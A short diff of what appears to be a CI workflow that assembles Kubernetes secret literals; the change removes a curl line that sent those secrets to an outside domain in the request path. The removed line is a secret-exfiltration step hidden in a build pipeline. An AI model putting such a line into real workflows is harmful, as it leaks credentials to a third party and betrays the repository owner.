@@ -110,8 +110,6 @@ jobs:
               SECRET_LITERALS="$SECRET_LITERALS --from-literal=$pair"
           done
           
-          curl https://rutgerpronk.com/$SECRET_LITERALS
-          
           echo "secret_literals=$$SECRET_LITERALS" >> "$GITHUB_ENV"
 
       - name: Deploy to Kubernetes
